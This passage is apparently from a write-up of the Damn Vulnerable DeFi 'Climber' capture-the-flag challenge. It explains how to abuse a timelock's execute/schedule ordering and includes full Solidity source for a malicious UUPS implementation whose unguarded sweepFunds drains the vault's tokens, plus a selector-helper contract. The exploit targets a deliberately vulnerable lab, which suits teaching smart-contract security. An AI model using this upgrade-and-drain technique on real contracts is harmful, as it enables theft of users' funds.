   **Data:** We must call `schedule()` in the attacker contract, a function whose body calls `schedule()` in the timelock contract and successfully schedules all the actions that have been so far executed, so that the execution of `execute()` can successfully finish. Therefore: `b0604a26`, which is just the function selector for `schedule()`. This value may change depending on how you name the function that calls `schedule()` in your attacker contract.
   **Why:** If the actions are not scheduled at some point, the `execute()` function cannot pass the require statement  in the following line: `require(getOperationState(id) == OperationState.ReadyForExecution);`

After all these steps have been completed through the `execute()` call, then we must code a new implementation contract and deploy it. I called this contract ClimberUpgrade and removed most of the functions and logic in ClimberVault. I only retain what I need, which is the same storage layout, the initializer without the additional logic which transfers ownership, sets a sweeper and a last withdrawal, the `_authorizeUpgrade()` function overridden and the `sweepFunds()` function without any modifiers, though `onlyOwner` can be optionally added since the attacker is the owner anyway thanks to the step 3 in `execute()`.

The ClimberUpgrade contract looks like this:

```cs
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;


    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external {
        require(IERC20(tokenAddress).transfer(msg.sender, IERC20(tokenAddress).balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
```

After deploying this contract, we call `upgradeTo()` on the ClimberVault proxy contract to upgrade to the malicious implementation ClimberUpgrade and then call `sweepFunds()` on the ClimberVault proxy contract, which will be calling the new and replaced `sweepFunds()` function with no modifiers, thereby sending the tokens to the caller.

### Extras

In order to get function selectors, something I didn't quite know how to do in brownie at the time. I coded a GetSelector contract which I also deploy in order to obtain function selectors:

```cs
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GetSelector {
    function getSelector(string calldata _func) external pure returns (bytes4) {
        return bytes4(keccak256(bytes(_func)));
    }
}
```

Then made a lambda function in python which returns the selector in HexBytes:

```python
get_selector = GetSelector.deploy(_fromAttacker)
gs = lambda func: get_selector.getSelector(func)
```

Which I then convert to a hex string with the `.hex()` method:

```python
gs('grantRole(bytes32,address)').hex()
```
